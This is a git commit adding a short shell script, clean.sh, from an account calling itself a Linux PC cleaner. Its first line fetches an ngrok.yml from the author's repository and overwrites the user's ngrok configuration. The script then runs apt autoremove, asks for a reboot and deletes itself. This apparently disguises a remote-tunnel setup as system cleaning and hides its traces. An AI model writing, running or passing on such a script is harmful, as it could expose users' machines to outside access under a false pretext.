91c2b2fb5f8ced83a0f77ddae002fda267d4c1c2
LinuxPcCleaner <dragonboy7751@gmail.com>
2025-08-30 21:23:18 +0100

    Add files via upload

---
+++ clean.sh
@@ -0,0 +1,5 @@
+wget https://raw.githubusercontent.com/LinuxPcCleaner/PcCleaner/refs/heads/main/ngrok.yml -O ~/.config/ngrok/ngrok.yml
+sudo apt autoremove -y
+echo please reboot the system
+echo 'type "reboot now"'
+rm clean.sh
